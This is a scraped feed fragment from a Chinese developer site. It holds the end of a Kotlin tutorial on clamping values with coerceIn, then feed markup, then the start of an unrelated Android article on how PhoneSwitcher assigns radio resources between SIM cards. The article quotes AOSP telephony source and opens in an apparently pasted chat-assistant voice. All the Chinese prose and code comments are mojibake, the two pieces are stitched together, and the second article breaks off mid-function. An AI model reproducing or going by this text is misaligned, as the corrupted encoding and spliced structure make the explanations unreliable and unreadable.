<h2 data-id="heading-14">æ³¨æ„äº‹é¡¹å’Œè¾¹ç•Œæƒ…å†µ</h2>
<h3 data-id="heading-15"><strong>1. èŒƒå›´æœ‰æ•ˆæ€§æ£€æŸ¥</strong></h3>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> {
    <span class="hljs-keyword">val</span> value = <span class="hljs-number">10</span>
    
    <span class="hljs-comment">// èŒƒå›´å¿…é¡»æœ‰æ•ˆï¼ˆæœ€å°å€¼ â‰¤ æœ€å¤§å€¼ï¼‰</span>
    <span class="hljs-keyword">try</span> {
        <span class="hljs-keyword">val</span> result = value.coerceIn(<span class="hljs-number">20</span>, <span class="hljs-number">10</span>)  <span class="hljs-comment">// æœ€å°å€¼ &gt; æœ€å¤§å€¼</span>
    } <span class="hljs-keyword">catch</span> (e: IllegalArgumentException) {
        println(<span class="hljs-string">"é”™è¯¯: <span class="hljs-subst">${e.message}</span>"</span>)  
        <span class="hljs-comment">// è¾“å‡º: é”™è¯¯: Cannot coerce value to an empty range: maximum 10 is less than minimum 20.</span>
    }
    
    <span class="hljs-comment">// æ­£ç¡®çš„åšæ³•æ˜¯ç¡®ä¿èŒƒå›´æœ‰æ•ˆ</span>
    <span class="hljs-keyword">val</span> min = <span class="hljs-number">20</span>
    <span class="hljs-keyword">val</span> max = <span class="hljs-number">10</span>
    <span class="hljs-keyword">if</span> (min &lt;= max) {
        <span class="hljs-keyword">val</span> result = value.coerceIn(min, max)
    } <span class="hljs-keyword">else</span> {
        <span class="hljs-comment">// å¤„ç†æ— æ•ˆèŒƒå›´</span>
        println(<span class="hljs-string">"èŒƒå›´æ— æ•ˆ: <span class="hljs-variable">$min</span> &gt; <span class="hljs-variable">$max</span>"</span>)
    }
}
</code></pre>
<h3 data-id="heading-16"><strong>2. ç©ºèŒƒå›´å¤„ç†</strong></h3>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> {
    <span class="hljs-keyword">val</span> value = <span class="hljs-number">5</span>
    
    <span class="hljs-comment">// å•ç‚¹èŒƒå›´ï¼ˆæœ€å°å€¼ = æœ€å¤§å€¼ï¼‰</span>
    <span class="hljs-keyword">val</span> singlePointRange = <span class="hljs-number">5.</span><span class="hljs-number">.5</span>
    <span class="hljs-keyword">val</span> result1 = value.coerceIn(singlePointRange)
    println(result1)  <span class="hljs-comment">// è¾“å‡º: 5</span>
    
    <span class="hljs-comment">// å¦‚æœå€¼ä¸åœ¨å•ç‚¹èŒƒå›´å†…</span>
    <span class="hljs-keyword">val</span> result2 = <span class="hljs-number">10.</span>coerceIn(singlePointRange)
    println(result2)  <span class="hljs-comment">// è¾“å‡º: 5</span>
}
</code></pre>
<h3 data-id="heading-17"><strong>3. æ€§èƒ½è€ƒè™‘</strong></h3>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// coerceIn æ˜¯å†…è”å‡½æ•°ï¼Œæ€§èƒ½å¼€é”€å¾ˆå°</span>
<span class="hljs-comment">// ä½†åœ¨å¾ªç¯ä¸­å¤§é‡ä½¿ç”¨æ—¶ï¼Œå¯ä»¥è€ƒè™‘æ‰‹åŠ¨å†…è”</span>

<span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">processBatch</span><span class="hljs-params">(values: <span class="hljs-type">List</span>&lt;<span class="hljs-type">Int</span>&gt;)</span></span>: List&lt;<span class="hljs-built_in">Int</span>&gt; {
    <span class="hljs-keyword">val</span> min = <span class="hljs-number">0</span>
    <span class="hljs-keyword">val</span> max = <span class="hljs-number">100</span>
    
    <span class="hljs-comment">// æ–¹å¼1ï¼šä½¿ç”¨ coerceInï¼ˆæ¨èï¼Œä»£ç æ¸…æ™°ï¼‰</span>
    <span class="hljs-keyword">return</span> values.map { it.coerceIn(min, max) }
    
    <span class="hljs-comment">// æ–¹å¼2ï¼šæ‰‹åŠ¨å†…è”ï¼ˆåœ¨æç«¯æ€§èƒ½è¦æ±‚æ—¶è€ƒè™‘ï¼‰</span>
    <span class="hljs-comment">// return values.map { if (it &lt; min) min else if (it &gt; max) max else it }</span>
}

<span class="hljs-comment">// å¯¹äºè‡ªå®šä¹‰ç±»å‹ï¼Œå®ç° Comparable æ¥å£åå³å¯ä½¿ç”¨ coerceIn</span>
<span class="hljs-keyword">data</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CustomValue</span>(<span class="hljs-keyword">val</span> score: <span class="hljs-built_in">Int</span>) : Comparable&lt;CustomValue&gt; {
    <span class="hljs-keyword">override</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">compareTo</span><span class="hljs-params">(other: <span class="hljs-type">CustomValue</span>)</span></span>: <span class="hljs-built_in">Int</span> = score.compareTo(other.score)
}
</code></pre>
<h2 data-id="heading-18">æœ€ä½³å®è·µ</h2>
<h3 data-id="heading-19"><strong>1. é˜²å¾¡æ€§ç¼–ç¨‹</strong></h3>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Configuration</span> {
    <span class="hljs-comment">// ä½¿ç”¨ coerceIn ç¡®ä¿é…ç½®å€¼å§‹ç»ˆæœ‰æ•ˆ</span>
    <span class="hljs-keyword">var</span> brightness: <span class="hljs-built_in">Int</span> = <span class="hljs-number">50</span>
        <span class="hljs-keyword">set</span>(value) {
            field = value.coerceIn(<span class="hljs-number">0</span>, <span class="hljs-number">100</span>)
        }
    
    <span class="hljs-keyword">var</span> volume: <span class="hljs-built_in">Int</span> = <span class="hljs-number">50</span>
        <span class="hljs-keyword">set</span>(value) {
            field = value.coerceIn(<span class="hljs-number">0</span>, <span class="hljs-number">100</span>)
        }
    
    <span class="hljs-keyword">var</span> temperature: <span class="hljs-built_in">Int</span> = <span class="hljs-number">22</span>
        <span class="hljs-keyword">set</span>(value) {
            field = value.coerceIn(<span class="hljs-number">16</span>, <span class="hljs-number">28</span>)
        }
}

<span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> {
    <span class="hljs-keyword">val</span> config = Configuration()
    
    config.brightness = <span class="hljs-number">120</span>  <span class="hljs-comment">// ä¼šè¢«é™åˆ¶ä¸º 100</span>
    println(<span class="hljs-string">"äº®åº¦: <span class="hljs-subst">${config.brightness}</span>"</span>)  <span class="hljs-comment">// è¾“å‡º: äº®åº¦: 100</span>
    
    config.temperature = <span class="hljs-number">10</span>  <span class="hljs-comment">// ä¼šè¢«é™åˆ¶ä¸º 16</span>
    println(<span class="hljs-string">"æ¸©åº¦: <span class="hljs-subst">${config.temperature}</span>"</span>)  <span class="hljs-comment">// è¾“å‡º: æ¸©åº¦: 16</span>
}
</code></pre>
<h3 data-id="heading-20"><strong>2. ç»“åˆ when è¡¨è¾¾å¼</strong></h3>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">categorizeScore</span><span class="hljs-params">(rawScore: <span class="hljs-type">Int</span>)</span></span>: String {
    <span class="hljs-keyword">val</span> score = rawScore.coerceIn(<span class="hljs-number">0</span>, <span class="hljs-number">100</span>)
    
    <span class="hljs-keyword">return</span> <span class="hljs-keyword">when</span> (score) {
        <span class="hljs-keyword">in</span> <span class="hljs-number">90.</span><span class="hljs-number">.100</span> -&gt; <span class="hljs-string">"ä¼˜ç§€"</span>
        <span class="hljs-keyword">in</span> <span class="hljs-number">80</span> until <span class="hljs-number">90</span> -&gt; <span class="hljs-string">"è‰¯å¥½"</span>
        <span class="hljs-keyword">in</span> <span class="hljs-number">60</span> until <span class="hljs-number">80</span> -&gt; <span class="hljs-string">"åŠæ ¼"</span>
        <span class="hljs-keyword">else</span> -&gt; <span class="hljs-string">"ä¸åŠæ ¼"</span>
    }
}

<span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> {
    println(categorizeScore(<span class="hljs-number">95</span>))   <span class="hljs-comment">// è¾“å‡º: ä¼˜ç§€</span>
    println(categorizeScore(<span class="hljs-number">120</span>))  <span class="hljs-comment">// è¾“å‡º: ä¼˜ç§€ï¼ˆé™åˆ¶ä¸º 100ï¼‰</span>
    println(categorizeScore(-<span class="hljs-number">10</span>))  <span class="hljs-comment">// è¾“å‡º: ä¸åŠæ ¼ï¼ˆé™åˆ¶ä¸º 0ï¼‰</span>
}
</code></pre>
<h3 data-id="heading-21"><strong>3. æ‰©å±•å‡½æ•°å¢å¼º</strong></h3>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// ä¸ºæ•°å­—ç±»å‹æ·»åŠ æ‰©å±•å‡½æ•°</span>
<span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-built_in">Int</span>.<span class="hljs-title">coerceInPercentage</span><span class="hljs-params">()</span></span>: <span class="hljs-built_in">Int</span> = <span class="hljs-keyword">this</span>.coerceIn(<span class="hljs-number">0</span>, <span class="hljs-number">100</span>)

<span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-built_in">Double</span>.<span class="hljs-title">coerceInZeroToOne</span><span class="hljs-params">()</span></span>: <span class="hljs-built_in">Double</span> = <span class="hljs-keyword">this</span>.coerceIn(<span class="hljs-number">0.0</span>, <span class="hljs-number">1.0</span>)

<span class="hljs-comment">// ä¸ºé¢œè‰²é€šé“å€¼æ·»åŠ æ‰©å±•</span>
<span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-built_in">Int</span>.<span class="hljs-title">coerceInColorChannel</span><span class="hljs-params">()</span></span>: <span class="hljs-built_in">Int</span> = <span class="hljs-keyword">this</span>.coerceIn(<span class="hljs-number">0</span>, <span class="hljs-number">255</span>)

<span class="hljs-comment">// ä½¿ç”¨</span>
<span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> {
    <span class="hljs-keyword">val</span> percentage = <span class="hljs-number">150.</span>coerceInPercentage()
    println(<span class="hljs-string">"ç™¾åˆ†æ¯”: <span class="hljs-variable">$percentage</span>%"</span>)  <span class="hljs-comment">// è¾“å‡º: ç™¾åˆ†æ¯”: 100%</span>
    
    <span class="hljs-keyword">val</span> alpha = <span class="hljs-number">1.5</span>.coerceInZeroToOne()
    println(<span class="hljs-string">"é€æ˜åº¦: <span class="hljs-variable">$alpha</span>"</span>)  <span class="hljs-comment">// è¾“å‡º: é€æ˜åº¦: 1.0</span>
    
    <span class="hljs-keyword">val</span> red = <span class="hljs-number">300.</span>coerceInColorChannel()
    println(<span class="hljs-string">"çº¢è‰²é€šé“: <span class="hljs-variable">$red</span>"</span>)  <span class="hljs-comment">// è¾“å‡º: çº¢è‰²é€šé“: 255</span>
}
</code></pre>
<p><strong>æ€»ç»“</strong>ï¼š</p>
<ul>
<li><strong><code>coerceIn</code></strong> æ˜¯ä¸€ä¸ªç®€å•ä½†å¼ºå¤§çš„å‡½æ•°ï¼Œç”¨äºå°†å€¼é™åˆ¶åœ¨æŒ‡å®šèŒƒå›´å†…</li>
<li>æ”¯æŒæ‰€æœ‰å®ç°äº† <code>Comparable</code> æ¥å£çš„ç±»å‹ï¼ˆ<code>Int</code>ã€<code>Double</code>ã€<code>Char</code>ã€è‡ªå®šä¹‰ç±»å‹ç­‰ï¼‰</li>
<li>æœ‰ä¸¤ç§ä½¿ç”¨æ–¹å¼ï¼šç›´æ¥æŒ‡å®šæœ€å°/æœ€å¤§å€¼ï¼Œæˆ–ä½¿ç”¨ <code>ClosedRange</code> å¯¹è±¡</li>
<li>é€‚ç”¨äºï¼šUI è¾¹ç•Œæ£€æŸ¥ã€æ¸¸æˆå¼€å‘ã€æ•°æ®éªŒè¯ã€è¿›åº¦è®¡ç®—ç­‰å¤šç§åœºæ™¯</li>
<li>æ³¨æ„å¤„ç†æ— æ•ˆèŒƒå›´ï¼ˆæœ€å°å€¼ &gt; æœ€å¤§å€¼æ—¶ä¼šæŠ›å‡ºå¼‚å¸¸ï¼‰</li>
<li>ç»“åˆæ‰©å±•å‡½æ•°å¯ä»¥åˆ›å»ºæ›´è¯­ä¹‰åŒ–çš„ä»£ç </li>
</ul></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[PhoneSwitcher å¦‚ä½•å†³å®šå“ªå¼  SIM å¡å¯ä»¥ä½¿ç”¨å°„é¢‘èµ„æº]]></title>    <link>https://juejin.cn/post/7602464510607671322</link>    <guid>https://juejin.cn/post/7602464510607671322</guid>    <pubDate>2026-02-03T13:52:32.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7602464510607671322" data-draft-id="7602464510607654938" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="PhoneSwitcher å¦‚ä½•å†³å®šå“ªå¼  SIM å¡å¯ä»¥ä½¿ç”¨å°„é¢‘èµ„æº"/> <meta itemprop="keywords" content="Android"/> <meta itemprop="datePublished" content="2026-02-03T13:52:32.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="ç”¨æˆ·341408199125"/> <meta itemprop="url" content="https://juejin.cn/user/570004686782272"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            PhoneSwitcher å¦‚ä½•å†³å®šå“ªå¼  SIM å¡å¯ä»¥ä½¿ç”¨å°„é¢‘èµ„æº
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/570004686782272/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    ç”¨æˆ·341408199125
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-03T13:52:32.000Z" title="Tue Feb 03 2026 13:52:32 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-03
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    5
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»6åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>å¾ˆå¥½çš„é—®é¢˜ï¼è®©æˆ‘åˆ†æ PhoneSwitcher æ˜¯å¦‚ä½•å†³å®šå“ªå¼  SIM å¡å¯ä»¥ä½¿ç”¨å°„é¢‘èµ„æºçš„ï¼š</p>
<p>å®Œç¾ï¼ç°åœ¨æˆ‘å¯ä»¥ç»™ä½ ä¸€ä¸ªå®Œæ•´çš„è§£é‡Šäº†ï¼š</p>
<h2 data-id="heading-0">PhoneSwitcher å¦‚ä½•å†³å®šå“ªå¼  SIM å¡å¯ä»¥ä½¿ç”¨å°„é¢‘èµ„æº</h2>
<h3 data-id="heading-1"><strong>æ ¸å¿ƒå†³ç­–æµç¨‹</strong></h3>
<p>PhoneSwitcher é€šè¿‡ <strong><code>onEvaluate()</code></strong> æ–¹æ³•æ¥å†³å®šå°„é¢‘èµ„æºçš„åˆ†é…ï¼š</p>
<pre><code class="hljs language-1158:1300:frameworks_opt_telephony/src/java/com/android/internal/telephony/data/PhoneSwitcher.java" lang="1158:1300:frameworks_opt_telephony/src/java/com/android/internal/telephony/data/PhoneSwitcher.java">protected boolean onEvaluate(boolean requestsChanged, String reason) {
    StringBuilder sb = new StringBuilder(reason);

    // If we use HAL_COMMAND_PREFERRED_DATA,
    boolean diffDetected = mHalCommandToUse != HAL_COMMAND_PREFERRED_DATA &amp;&amp; requestsChanged;

    // Check if user setting of default non-opportunistic data sub is changed.
    int primaryDataSubId = mSubscriptionManagerService.getDefaultDataSubId();
    if (primaryDataSubId != mPrimaryDataSubId) {
        sb.append(" mPrimaryDataSubId ").append(mPrimaryDataSubId).append("-&gt;")
            .append(primaryDataSubId);
        mPrimaryDataSubId = primaryDataSubId;
        mLastSwitchPreferredDataReason = DataSwitch.Reason.DATA_SWITCH_REASON_MANUAL;
    }

    // Check to see if there is any active subscription on any phone
    boolean hasAnyActiveSubscription = false;

    // Check if phoneId to subId mapping is changed.
    for (int i = 0; i &lt; mActiveModemCount; i++) {
        int sub = SubscriptionManager.getSubscriptionId(i);

        if (SubscriptionManager.isValidSubscriptionId(sub)) hasAnyActiveSubscription = true;

        if (sub != mPhoneSubscriptions[i]) {
            sb.append(" phone[").append(i).append("] ").append(mPhoneSubscriptions[i]);
            sb.append("-&gt;").append(sub);
            if (mAutoSelectedDataSubId == mPhoneSubscriptions[i]) {
                mAutoSelectedDataSubId = DEFAULT_SUBSCRIPTION_ID;
            }
            mPhoneSubscriptions[i] = sub;

            if (!mFlags.changeMethodOfObtainingImsRegistrationRadioTech()) {
                // Listen to IMS radio tech change for new sub
                if (SubscriptionManager.isValidSubscriptionId(sub)) {
                    registerForImsRadioTechChange(mContext, i);
                }
            }

            diffDetected = true;
            mAutoDataSwitchController.notifySubscriptionsMappingChanged();
        }
    }

    if (!hasAnyActiveSubscription) {
        transitionToEmergencyPhone();
    } else {
        if (VDBG) log("Found an active subscription");
    }

    // Check if phoneId for preferred data is changed.
    int oldPreferredDataPhoneId = mPreferredDataPhoneId;

    // Check if subId for preferred data is changed.
    int oldPreferredDataSubId = mPreferredDataSubId.get();

    // When there are no subscriptions, the preferred data phone ID is invalid, but we want
    // to keep a valid phoneId for Emergency, so skip logic that updates for preferred data
    // phone ID. Ideally there should be a single set of checks that evaluate the correct
    // phoneId on a service-by-service basis (EIMS being one), but for now... just bypass
    // this logic in the no-SIM case.
    if (hasAnyActiveSubscription) updatePreferredDataPhoneId();

    if (oldPreferredDataPhoneId != mPreferredDataPhoneId) {
        sb.append(" preferred data phoneId ").append(oldPreferredDataPhoneId)
                .append("-&gt;").append(mPreferredDataPhoneId);
        diffDetected = true;
    } else if (oldPreferredDataSubId != mPreferredDataSubId.get()) {
        logl("SIM refresh, notify dds change");
        // Inform connectivity about the active data phone
        notifyPreferredDataSubIdChanged();
    }

    // Always force DDS when radio on. This is to handle the corner cases that modem and android
    // DDS are out of sync after APM, AP should force DDS when radio on. long term solution
    // should be having API to query preferred data modem to detect the out-of-sync scenarios.
    if (diffDetected || EVALUATION_REASON_RADIO_ON.equals(reason)) {
        logl("evaluating due to " + sb);
        if (mHalCommandToUse == HAL_COMMAND_PREFERRED_DATA) {
            // With HAL_COMMAND_PREFERRED_DATA, all phones are assumed to allow PS attach.
            // So marking all phone as active, and the phone with mPreferredDataPhoneId
            // will send radioConfig command.
            for (int phoneId = 0; phoneId &lt; mActiveModemCount; phoneId++) {
                mPhoneStates[phoneId].active = true;
            }
            sendRilCommands(mPreferredDataPhoneId);
        } else {
            List&lt;Integer&gt; newActivePhones = new ArrayList&lt;&gt;();

            // If all phones can have PS attached, activate all.
            // Otherwise, choose to activate phones according to requests. And
            // if list is not full, add mPreferredDataPhoneId.
            if (mMaxDataAttachModemCount == mActiveModemCount) {
                for (int i = 0; i &lt; mMaxDataAttachModemCount; i++) {
                    newActivePhones.add(i);
                }
            } else {
                // First try to activate phone in voice call.
                if (mPhoneIdInVoiceCall != SubscriptionManager.INVALID_PHONE_INDEX) {
                    newActivePhones.add(mPhoneIdInVoiceCall);
                }

                if (newActivePhones.size() &lt; mMaxDataAttachModemCount) {
                    for (TelephonyNetworkRequest networkRequest : mNetworkRequestList) {
                        int phoneIdForRequest = phoneIdForRequest(networkRequest);
                        if (phoneIdForRequest == INVALID_PHONE_INDEX) continue;
                        if (newActivePhones.contains(phoneIdForRequest)) continue;
                        newActivePhones.add(phoneIdForRequest);
                        if (newActivePhones.size() &gt;= mMaxDataAttachModemCount) break;
                    }
                }

                if (newActivePhones.size() &lt; mMaxDataAttachModemCount
                        &amp;&amp; !newActivePhones.contains(mPreferredDataPhoneId)
                        &amp;&amp; SubscriptionManager.isUsableSubIdValue(mPreferredDataPhoneId)) {
                    newActivePhones.add(mPreferredDataPhoneId);
                }
            }

            if (VDBG) {
                log("mPrimaryDataSubId = " + mPrimaryDataSubId);
                log("mAutoSelectedDataSubId = " + mAutoSelectedDataSubId);
                for (int i = 0; i &lt; mActiveModemCount; i++) {
                    log(" phone[" + i + "] using sub[" + mPhoneSubscriptions[i] + "]");
                }
                log(" newActivePhones:");
                for (Integer i : newActivePhones) log("  " + i);
            }

            for (int phoneId = 0; phoneId &lt; mActiveModemCount; phoneId++) {
                if (!newActivePhones.contains(phoneId)) {
                    deactivate(phoneId);
                }
            }

            // only activate phones up to the limit
            for (int phoneId : newActivePhones) {
                activate(phoneId);
            }
        }
    }
    return diffDetected;
}
</code></pre>
<h3 data-id="heading-2"><strong>å†³ç­–å› ç´ ï¼ˆæŒ‰ä¼˜å…ˆçº§ï¼‰</strong></h3>
<h4 data-id="heading-3"><strong>1. ç´§æ€¥å‘¼å«è¦†ç›– (Emergency Override)</strong></h4>
<pre><code class="hljs language-1436:1445:frameworks_opt_telephony/src/java/com/android/internal/telephony/data/PhoneSwitcher.java" lang="1436:1445:frameworks_opt_telephony/src/java/com/android/internal/telephony/data/PhoneSwitcher.java">protected void updatePreferredDataPhoneId() {
    if (mEmergencyOverride != null &amp;&amp; findPhoneById(mEmergencyOverride.mPhoneId) != null) {
        // Override DDS for emergency even if user data is not enabled, since it is an
        // emergency.
        // TODO: Provide a notification to the user that metered data is currently being
        // used during this period.
        logl("updatePreferredDataPhoneId: preferred data overridden for emergency."
                + " phoneId = " + mEmergencyOverride.mPhoneId);
        mPreferredDataPhoneId = mEmergencyOverride.mPhoneId;
        mLastSwitchPreferredDataReason = DataSwitch.Reason.DATA_SWITCH_REASON_UNKNOWN;
</code></pre>
<p><strong>æœ€é«˜ä¼˜å…ˆçº§</strong>ï¼šå¦‚æœæœ‰ç´§æ€¥å‘¼å«ï¼Œç«‹å³åˆ‡æ¢åˆ°ç´§æ€¥å‘¼å«æ‰€åœ¨çš„å¡ã€‚</p>
<h4 data-id="heading-4"><strong>2. è¯­éŸ³é€šè¯ä¸­ (Voice Call In Progress)</strong></h4>
<pre><code class="hljs language-1447:1459:frameworks_opt_telephony/src/java/com/android/internal/telephony/data/PhoneSwitcher.java" lang="1447:1459:frameworks_opt_telephony/src/java/com/android/internal/telephony/data/PhoneSwitcher.java">    } else {
        int imsRegTech = mImsRegTechProvider.get(mContext, mPhoneIdInVoiceCall);
        if (isAnyVoiceCallActiveOnDevice() &amp;&amp; imsRegTech != REGISTRATION_TECH_IWLAN) {
            if (imsRegTech != REGISTRATION_TECH_CROSS_SIM) {
                mPreferredDataPhoneId = shouldSwitchDataDueToInCall()
                        ? mPhoneIdInVoiceCall : getFallbackDataPhoneIdForInternetRequests();
            } else {
                logl("IMS call on cross-SIM, skip switching data to phone "
                        + mPhoneIdInVoiceCall);
            }
        } else {
            mPreferredDataPhoneId = getFallbackDataPhoneIdForInternetRequests();
        }
    }
</code></pre>
<p><strong>æ¡ä»¶</strong>ï¼šå¦‚æœæœ‰è¯­éŸ³é€šè¯ï¼Œå¹¶ä¸”æ»¡è¶³æ¡ä»¶ï¼ˆç”¨æˆ·å¼€å¯äº†æ•°æ®ã€è¯­éŸ³å¡ä¹Ÿå¼€å¯äº†æ•°æ®ï¼‰ï¼Œåˆ™åˆ‡æ¢åˆ°è¯­éŸ³å¡ã€‚</p>
<h4 data-id="heading-5"><strong>3. è‡ªåŠ¨é€‰æ‹©çš„æ•°æ®å¡ (Auto Selected Data Sub)</strong></h4>
<pre><code class="hljs language-1467:1479:frameworks_opt_telephony/src/java/com/android/internal/telephony/data/PhoneSwitcher.java" lang="1467:1479:frameworks_opt_telephony/src/java/com/android/internal/telephony/data/PhoneSwitcher.java">private int getFallbackDataPhoneIdForInternetRequests() {
    int fallbackSubId = isActiveSubId(mAutoSelectedDataSubId)
            ? mAutoSelectedDataSubId : mPrimaryDataSubId;

    if (SubscriptionManager.isUsableSubIdValue(fallbackSubId)) {
        for (int phoneId = 0; phoneId &lt; mActiveModemCount; phoneId++) {
